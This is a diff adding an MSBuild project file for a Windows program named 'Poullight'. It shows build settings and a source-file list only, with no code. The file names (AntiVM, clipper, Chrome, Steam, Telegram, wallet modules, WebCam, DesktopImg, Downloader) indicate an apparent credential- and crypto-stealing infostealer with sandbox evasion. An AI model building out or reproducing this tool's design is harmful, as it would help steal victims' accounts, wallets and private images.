@@ -1,0 +1,130 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{E37C6B55-D3F7-4CAA-A6CD-A3F2320C609D}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Poullight</RootNamespace>
+    <AssemblyName>Poullight</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <StartupObject>EntryLoader.EntryPoint</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="AntiReplaySender.cs" />
+    <Compile Include="AntiVM.cs" />
+    <Compile Include="Base64.cs" />
+    <Compile Include="BTCByte.cs" />
+    <Compile Include="BTCDASH.cs" />
+    <Compile Include="BTCETH.cs" />
+    <Compile Include="BTCMON.cs" />
+    <Compile Include="BTCQt.cs" />
+    <Compile Include="Buffer.cs" />
+    <Compile Include="CBoard.cs" />
+    <Compile Include="Chrome.cs" />
+    <Compile Include="clipper.cs" />
+    <Compile Include="CreateDir.cs" />
+    <Compile Include="DesktopImg.cs" />
+    <Compile Include="DFiles.cs" />
+    <Compile Include="DirectoryCopy.cs" />
+    <Compile Include="Downloader.cs" />
+    <Compile Include="DS.cs" />
+    <Compile Include="EGChromeC.cs" />
+    <Compile Include="Encrypter.cs" />
+    <Compile Include="EntryLoader\EntryPoint.cs" />
+    <Compile Include="Exporter.cs" />
+    <Compile Include="FZ.cs" />
+    <Compile Include="GetRandom.cs" />
+    <Compile Include="HandlerParams.cs" />
+    <Compile Include="Information.cs" />
+    <Compile Include="NordVPN.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Check.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\CryptoException.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Digests\GeneralDigest.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Digests\Sha256Digest.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Engines\AesEngine.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\IBlockCipher.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\ICipherParameters.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\IDigest.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\GcmBlockCipher.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\Gcm\GcmUtilities.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\Gcm\IGcmExponentiator.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\Gcm\IGcmMultiplier.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\Gcm\Tables1kGcmExponentiator.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\Gcm\Tables8kGcmMultiplier.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Parameters\AeadParameters.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Parameters\KeyParameter.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Prng\CryptoApiRandomGenerator.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Prng\DigestRandomGenerator.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Prng\IRandomGenerator.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Utilities\Pack.cs" />
+    <Compile Include="Org\BouncyCastle\Security\DigestUtilities.cs" />
+    <Compile Include="Org\BouncyCastle\Security\SecureRandom.cs" />
+    <Compile Include="Org\BouncyCastle\Utilities\Arrays.cs" />
+    <Compile Include="Org\BouncyCastle\Utilities\Enums.cs" />
+    <Compile Include="Org\BouncyCastle\Utilities\Platform.cs" />
+    <Compile Include="Pidgin.cs" />
+    <Compile Include="ProcList.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="Recursive.cs" />
+    <Compile Include="Skype.cs" />
+    <Compile Include="Sqlite.cs" />
+    <Compile Include="Starter.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Starter.Designer.cs">
+      <DependentUpon>Starter.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Steam.cs" />
+    <Compile Include="TG.cs" />
+    <Compile Include="WebCam.cs" />
+    <Compile Include="WinApi.cs" />
+    <Compile Include="XS.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="XS.Designer.cs">
+      <DependentUpon>XS.cs</DependentUpon>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Properties\Resources.resources" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
